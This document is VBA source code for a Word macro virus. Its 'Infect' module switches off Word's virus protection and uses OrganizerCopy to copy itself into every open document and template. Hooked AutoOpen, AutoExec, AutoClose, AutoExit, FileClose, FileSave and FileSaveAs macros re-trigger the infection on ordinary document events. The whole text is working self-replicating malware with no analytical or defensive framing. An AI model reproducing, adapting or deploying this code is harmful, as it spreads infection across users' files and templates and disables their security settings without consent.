   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Infect"
   Sub MAIN()

       myname = ThisDocument.FullName
       Word.Options.VirusProtection = False

       For Each d In Word.Documents
           If (d.FullName <> myname) Then
               Debug.Print myname + " -> " + d.FullName
               Call CopyMacros(myname, d.FullName)
           End If
       Next d

       For Each t In Word.Templates
           If (t.FullName <> myname) Then
               Call CopyMacros(myname, t.FullName)
           End If
       Next t
       Rem Application.OrganizerCopy "d:\test2.doc", "d:\test1.doc", "Test", 3
   End Sub

   Sub CopyMacros(ByVal s As String, ByVal d As String)
       On Error GoTo AlreadyInfected

       Application.OrganizerCopy s, d, "Infect", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "AutoClose", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "AutoExec", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "AutoOpen", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "AutoExit", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "FileClose", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "FileSave", wdOrganizerObjectProjectItems
       Application.OrganizerCopy s, d, "FileSaveAs", wdOrganizerObjectProjectItems

   AlreadyInfected:
   End Sub

   Sub SaveDoc()
       If (Application.ActiveDocument.Saved = False) Then
           If (Application.ActiveDocument.Path <> "") Then
               Application.ActiveDocument.Save
           End If
       End If
   End Sub

   Attribute VB_Name = "AutoClose"
   Sub MAIN()
       Infect.MAIN
       Infect.SaveDoc
   End Sub


   Attribute VB_Name = "AutoExec"
   Sub MAIN()
       Infect.MAIN
   End Sub


   Attribute VB_Name = "AutoOpen"
   Sub MAIN()
       Infect.MAIN
   End Sub

   Attribute VB_Name = "AutoExit"
   Sub MAIN()
       Infect.MAIN
   End Sub


   Attribute VB_Name = "FileClose"
   Sub MAIN()
       Infect.MAIN
       Infect.SaveDoc
   End Sub


   Attribute VB_Name = "FileSave"
   Sub MAIN()
       Infect.MAIN
   End Sub


   Attribute VB_Name = "FileSaveAs"
   Sub MAIN()
       Infect.MAIN
       Word.Dialogs(wdDialogFileSaveAs).Show
   End Sub
